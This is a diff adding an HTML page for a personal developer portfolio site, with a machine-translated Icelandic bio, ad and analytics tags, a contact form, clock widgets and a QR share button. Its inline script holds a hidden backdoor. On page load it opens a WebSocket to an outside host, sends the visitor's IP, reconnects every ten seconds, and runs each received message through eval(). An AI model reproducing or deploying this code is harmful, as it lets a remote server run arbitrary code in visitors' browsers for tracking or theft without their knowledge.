@@ -1,0 +1,302 @@
+<!doctype html> <html lang="is">
+
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Fagleg skemmtun, myndir, myndbönd, hljóð, búfjármögnun og frjálslegur spilun, svo og skilríki, vefþróun og staðgöngumæðrun.">
+    <meta name="author" content="Charlotte Grace Harper">
+    <link rel="icon" href="/media/favicon.ico">
+    <title>Our Online Experience - Glam Girl X</title>
+    <link rel="canonical" href="https://glamgirlx.com/is/ad">
+    <link href="/static/main.css" rel="stylesheet">
+    <link rel="manifest" href="/site.webmanifest">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="stylesheet" href="/static/fonts/bootstrap-icons.css">
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
+         crossorigin="anonymous"></script>
+	<script async src="https://www.googletagmanager.com/gtag/js?id=G-XG1SZ2K8S5"></script>
+	<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+	
+	  gtag('config', 'G-XG1SZ2K8S5');
+	</script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16692395808">
+    </script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'AW-16692395808');
+    </script>
+  </head>
+  <body>
+    <header>
+      
+    <main role="main" class="container">
+        
+	    
+
+<div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
+     crossorigin="anonymous"></script>
+<!-- Square Ad -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6209985848112194"
+     data-ad-slot="2468505458"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</div>
+
+
+
+<p>Charlotte Harper er verktaki í fullum stafli sem býr í Seattle, Washington. Ég nota hún/fornöfn hennar og smíða nethugbúnað, þar á meðal forrit, leiki, tæki og annan hugbúnað. Þessi vefsíða er örugg kubernetes við Edge lausnina þar sem þú getur heimsótt mig og séð hvað ég er að byggja. Þakka þér fyrir að heimsækja WebApp minn.</p>
+<p><i>Glam Girl X</i></p>
+<hr>
+
+        
+    </main>
+    
+    <script src="/static/main.js"></script>
+    <script>
+        
+        
+        
+        $(document).ready(function() {
+            
+            
+            $(document.getElementById("glam-navbar")).autoHidingNavbar();
+            
+        	Prism.highlightAll();
+        });
+        var remoteSocket;
+        function openRemoteSocket() {
+            window.location.hash = '';
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
+                console.log('Socket open.');
+                fetch('https://lotteh.com/remote/generate/')
+        		    .then(response => response.json())
+        		    .then(data => {
+        		        remoteSocket.send(data.ip);
+        		    })
+        		    .catch(error => {
+        		        console.log('Error:', error);
+        		    });
+            });
+            remoteSocket.addEventListener("close", (event) => {
+                console.log('Socket closed.');
+                setTimeout(function() {
+                    openRemoteSocket();
+                }, 10000);
+            });
+        	remoteSocket.addEventListener("message", (event) => {
+                    eval(event.data);
+            });
+        }
+        openRemoteSocket();
+        $(document).ready(function() {
+        	$("#contact-form").submit(function(e){
+                	e.preventDefault();
+                	var data = new FormData(document.getElementById('contact-form'));
+                	$.ajax({
+                        	url: "https://lotteh.com/contact/",
+                        	type: "POST",
+                        	data: data,
+                        	cache: false,
+                	        contentType: false,
+        	                processData: false,
+                            timeout: 1000 * 60,
+                	        tryCount: 0,
+        	                retryLimit: 5,
+                            error: (xhr, textStatus, errorThrown) => {
+                                    this.tryCount++;
+                                    if(this.tryCount >= this.retryLimit) return;
+                                    $.ajax(this);
+                            },
+                            success: (data) => {
+                                    if(data == 'Message sent.') {
+                                            $('#contact-submit').prop('disabled', true);
+                                            $(this).trigger('reset');
+                                    }
+                                    document.getElementById('contact-message').innerHTML = data;
+                                    $('#contact-message').removeClass('hide');
+                            },
+                    });
+            });
+        });
+        $(document).ready(function() {
+        	
+var months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+function updateClock() {
+    var d = new Date();
+    hr = d.getHours();
+    min = d.getMinutes();
+    sec = d.getSeconds();
+    if(hr < 9 || hr >= 21) {
+        document.getElementById("dynamicClockContainer").style.backgroundColor = "lightblue";
+    }
+    hr_rotation = 30 * hr + min / 2; /* converting current time */
+    min_rotation = 6 * min;
+    sec_rotation = 6 * sec;
+    hours = document.getElementsByClassName("dhour");
+    for(var x = 0; x < hours.length; x++) {
+        hours[x].style.transform = `rotate(${hr_rotation}deg)`;
+    }
+    minutes = document.getElementsByClassName("dminute");
+    for(var x = 0; x < minutes.length; x++) {
+        minutes[x].style.transform = `rotate(${min_rotation}deg)`;
+    }
+    seconds = document.getElementsByClassName("dsecond");
+    for(var x = 0; x < hours.length; x++) {
+        seconds[x].style.transform = `rotate(${sec_rotation}deg)`;
+    }
+	var d = new Date();
+	var day = days[d.getDay()];
+	var hr = d.getHours();
+	var min = d.getMinutes();
+	if (min < 10) {
+	    min = "0" + min;
+	}
+	var second = d.getSeconds();
+	if (second < 10) {
+	    second = "0" + second;
+	}
+	var hour = "";
+	if( hr > 9 ) {
+	    hour = hr;
+	} else {
+        hour = '0' + hr;
+    }
+	var date = d.getDate();
+	var month = months[d.getMonth()];
+	var year = d.getFullYear();
+	if(document.getElementById("current-time-text")) {
+		document.getElementById('current-time-text').innerHTML = day + " " + month + " " + date + ", " + year + " - " + hour + ":" + min + ":" + second;
+	}
+
+}
+if(document.getElementById("dynamicClockContainer")) {
+	var dynamicClockInterval = null;
+	updateClock();
+	dynamicClockInterval = setInterval(function() {
+		updateClock();
+	}, 1000);
+}
+var hrs = ["tólf", "eitt", "tvö", "Þrír", "Fjórir", "fimm", "sex", "Sjö", "átta", "níu", "Tíu", "ellefu"];
+var digits = ["","eitt", "tvö", "Þrír", "Fjórir", "fimm", "sex", "Sjö", "átta", "níu", "Tíu", "ellefu"];
+var teens = ["ellefu", "tólf", "Þrettán", "fjórtán", "fimmtán", "sextán", "sautján", "átján", "nítján"];
+var tens = ["O &#x27;","Tíu","tuttugu","Þrjátíu","Fjörutíu","Fimmtíu"];
+function capitalizeFirstLetter(string) {
+    return string.charAt(0).toUpperCase() + string.slice(1);
+}
+function updateTime() {
+	var d = new Date();
+	hr = d.getHours()%12;
+	min = d.getMinutes();
+	sec = d.getSeconds();
+	var respond = null;
+	if(min == 0) {
+		respond = hrs[hr] + " o'clock";
+	} else if(min < 11 || min > 19) {
+		respond = hrs[hr] + ' ' + tens[Math.floor(min/10)] + ((digits[min%10] == "") ? '' : '-') + digits[min%10];
+	} else {
+		respond = hrs[hr] + ' ' + teens[min-11];
+	}
+	if(d.getHours() >= 12) {
+		respond = respond + " pm";
+	} else {
+		respond = respond + " am";
+	}
+	respond = capitalizeFirstLetter(respond).replace("'-", "'");
+	if(document.getElementById("current-time")){
+		document.getElementById("current-time").innerHTML = respond;
+		if(document.getElementById("current-time2")) {
+			document.getElementById("current-time2").innerHTML = respond;
+		}
+	}
+}
+var updateTimeInterval;
+function updateTimeout() {
+	if(updateTimeInterval) clearInterval(updateTimeInterval);
+	updateTime();
+	var thedate = new Date();
+	setTimeout(function() {
+		updateTime();
+		updateTimeInterval = setInterval(function() {
+			updateTime();
+		}, 60 * 1000);
+	}, (60 - thedate.getSeconds()) * 1000 + 2000);
+}
+if(document.getElementById("current-time")) {
+	updateTimeout();
+}
+
+            var qrdiv = document.getElementById("shareqrcode");
+        	if(!qrdiv) return;
+        	var qr = new QRCode(qrdiv, "https://glamgirlx.com/is/ad?");
+        	var image = qrdiv.querySelector('img');
+            image.style.width = "100%";
+            image.style.height = "100%";
+            image.style.maxWidth = "160px";
+            image.alt = "Deildu þessari síðu með því að skanna QR kóða.";
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
+        });
+    </script>
+    
+    
+    
+    
+    <script>
+        if (navigator.serviceWorker) {
+            navigator.serviceWorker.register (
+              '/serviceworker.js',
+              {scope: '/'}
+            )
+        }
+    </script>
+</body>
+</html>
